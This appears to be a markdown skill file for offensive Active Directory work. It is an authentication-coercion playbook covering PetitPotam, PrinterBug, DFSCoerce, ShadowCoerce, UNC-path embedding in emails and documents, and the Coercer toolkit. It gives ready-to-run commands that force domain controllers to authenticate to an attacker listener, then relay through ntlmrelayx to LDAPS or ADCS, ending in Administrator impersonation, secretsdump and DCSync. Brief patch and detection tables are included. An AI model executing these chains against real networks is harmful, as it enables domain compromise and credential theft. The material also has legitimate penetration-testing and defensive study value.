---
name: offensive-coercion
description: "Authentication coercion attack methodology — primitives that force a Windows machine (especially DCs and file servers) to authenticate to an attacker-controlled host. Covers PetitPotam (MS-EFSRPC), PrinterBug (MS-RPRN), DFSCoerce (MS-DFSNM), ShadowCoerce (MS-FSRVP), WebDAV (UNC path embedded in any web fetch), Coercer unified toolkit, and the full coercion-to-relay-to-RBCD chain. Use to generate captured authentication for NTLM relay attacks when LLMNR poisoning isn't yielding the right targets."
---

# Authentication Coercion

When you need a specific machine (typically a Domain Controller or file server) to authenticate to your relay listener, coercion forces it. Modern AD attacks often start here — coerce DC$, relay to LDAPS or ADCS, walk away with DA.

## Quick Workflow

1. Identify a target machine (typically a DC) and your attacker-listener IP
2. Pick a coercion primitive based on services running on the target
3. Confirm RPC reachability on the relevant port
4. Trigger coercion; monitor relay output
5. Pivot from the relayed authentication

---

## Coercion Primitives

| Technique | Protocol / RPC | Target Service |
|---|---|---|
| PetitPotam | MS-EFSRPC | EFS RPC service (often on DCs) |
| PrinterBug | MS-RPRN | Print Spooler |
| DFSCoerce | MS-DFSNM | DFS Namespace service |
| ShadowCoerce | MS-FSRVP | Volume Shadow Copy Service |
| WebDAV (UNC) | HTTP / WebDAV | Any browser fetching a UNC path embedded in HTML/PDF |
| ShellBag (DFS) | DFS namespace ref | File Explorer auto-resolution |

## PetitPotam (MS-EFSRPC)

Calls `EfsRpcOpenFileRaw`, `EfsRpcEncryptFileSrv` on the target — the target's service authenticates to the attacker-supplied UNC path.

```bash
# Standard
PetitPotam.py -u low_user -p pass attacker-ip dc.corp.local

# Without authentication (works pre-patch on some targets)
PetitPotam.py attacker-ip dc.corp.local

# Specific function variant
PetitPotam.py -pipe efsrpc -u low_user -p pass attacker-ip dc.corp.local
```

EFSRPC uses RPC over various pipes: `\PIPE\efsrpc`, `\PIPE\lsarpc`, `\PIPE\samr`, `\PIPE\netlogon`, `\PIPE\lsass`. Test multiple if patches block some.

Microsoft's PetitPotam patches over the years closed specific function entries; new ones keep emerging.

## PrinterBug (MS-RPRN)

```bash
# Trigger via RpcRemoteFindFirstPrinterChangeNotificationEx
printerbug.py user:pass@target attacker-ip
# Or
SpoolSample.exe target attacker-ip   # from Cube0x0
```

Requires Print Spooler running on target. Default: enabled on most Windows servers, including DCs (mitigated post-PrintNightmare via spooler-disable advisories, but not universal).

## DFSCoerce (MS-DFSNM)

```bash
dfscoerce.py -u low_user -p pass attacker-ip dc.corp.local
```

Targets DFS Namespace service — typically on DCs in environments using DFS. Microsoft has released patches; pre-patch DCs remain vulnerable.

## ShadowCoerce (MS-FSRVP)

```bash
# Specific RPC call abuse
shadowcoerce.py -u low_user -p pass attacker-ip dc.corp.local
```

Volume Shadow Copy Service. Coerces auth via remote shadow copy operations.

## WebDAV / UNC Path Embedding

Any HTML, PDF, Office document, or LNK file that references a UNC path causes the consumer to fetch it via SMB → authenticates to attacker's listener.

```bash
# Embedded image in email signature: <img src="\\attacker\share\img.png">
# When viewed, Outlook fetches → SMB auth to attacker

# LNK file with icon path
# In Windows Explorer: when the folder is browsed, icon resolution → auth

# Office document remote template
# Word doc with attached template at \\attacker\share\template.dotm
```

Useful when you have email or shared-drive write access but no RPC reachability to a coerce target.

## Coercer (Unified Toolkit)

```bash
# Coercer combines many primitives + auto-discovery
git clone https://github.com/p0dalirius/Coercer
cd Coercer
python3 Coercer.py coerce \
  -t dc.corp.local \
  -u low_user -p pass -d corp.local \
  -l attacker-ip

# Scan for vulnerable methods first
python3 Coercer.py scan \
  -t 10.0.0.0/24 \
  -u low_user -p pass -d corp.local \
  -l attacker-ip
```

Coercer iterates through all known primitives. Useful when you don't know which ones are unpatched.

## Full Chain Example: DC → LDAP via Coercion

```bash
# 1. Set up LDAP relay listener
sudo impacket-ntlmrelayx -t ldaps://dc --delegate-access \
  -wh attacker.corp.local &

# 2. Coerce DC to authenticate to attacker
PetitPotam.py -u low_user -p pass attacker-ip dc.corp.local

# 3. Authentication arrives at attacker, relayed to LDAPS
# 4. impacket-ntlmrelayx sets msDS-AllowedToActOnBehalfOfOtherIdentity on DC
# 5. RBCD configured: attacker can S4U2self+S4U2proxy as any user to dc

# Now: act as Administrator on the DC
impacket-getST -spn cifs/dc.corp.local -impersonate Administrator \
  -dc-ip dc.corp.local 'corp.local/attacker$'
KRB5CCNAME=Administrator.ccache impacket-secretsdump -k -no-pass dc.corp.local
```

## Full Chain: DC → ADCS (ESC8)

```bash
# 1. ADCS relay listener
sudo impacket-ntlmrelayx -t http://ca.corp.local/certsrv/certfnsh.asp \
  --adcs --template DomainController -smb2support &

# 2. Coerce
PetitPotam.py attacker-ip dc.corp.local

# 3. ntlmrelayx receives auth, requests cert as DC, gets DC's PFX
# 4. Authenticate to KDC with cert via certipy
certipy auth -pfx dc.pfx -dc-ip dc.corp.local

# Output: DC's NT hash → DCSync → krbtgt → Golden Ticket
```

## Identifying What Targets Run

Before triggering coercion, identify which RPC services run on the target:

```bash
# Check open RPC endpoints
impacket-rpcdump dc.corp.local | grep -iE "(efsr|rprn|dfsnm|fsrvp)"

# Service-specific checks
nxc smb dc.corp.local --shares     # if SYSVOL/NETLOGON visible, target's likely a DC
```

## Patch Awareness

| Patch | Mitigation |
|---|---|
| PetitPotam initial patch | Specific RPC functions removed |
| KB5005413 + later | More EFSRPC functions removed |
| PrintNightmare-related patches | PrintSpooler service often disabled on DCs |
| DFSCoerce patches | MS-DFSNM specific functions hardened |

Coercion is a moving target. New primitives are published regularly. Use Coercer to test all known primitives at engagement time.

## Detection

| Signal | Defender View |
|---|---|
| EFSRPC traffic from low-priv to DC | NIDS / endpoint logging |
| Print Spooler RPC calls between hosts | Spooler logs (if enabled) |
| MS-DFSNM coercion patterns | NIDS signatures published in 2022+ |
| Large volume of coercion attempts | Coercer's broad scan is loud |

MDI (Defender for Identity) detects several coercion patterns. Targeted single-coercion of a known DC is quieter than a broad scan.

## Engagement Cheatsheet

```bash
# 1. Identify target machines (DCs, file servers)
nxc smb 10.0.0.0/24 -u user -p pass

# 2. Set up relay listener (LDAP/ADCS as needed)
sudo impacket-ntlmrelayx -t <target> -wh attacker.corp.local --delegate-access

# 3. Coerce a target
Coercer.py coerce -t dc.corp.local -u low -p pass -l attacker-ip

# 4. Confirm relay output (RBCD / cert / shell)

# 5. Pivot from relayed identity (S4U / impersonation / direct auth)

# 6. Document: target, primitive used, relay outcome, post-exploitation
```

---

## Key References

- "PetitPotam" research: github.com/topotam/PetitPotam
- Coercer: github.com/p0dalirius/Coercer
- "Coercion attacks in AD" (Dirk-jan Mollema research)
- MS Security advisories on each coercion CVE
- Source: https://github.com/SnailSploit/offensive-checklist/blob/main/coercion.md
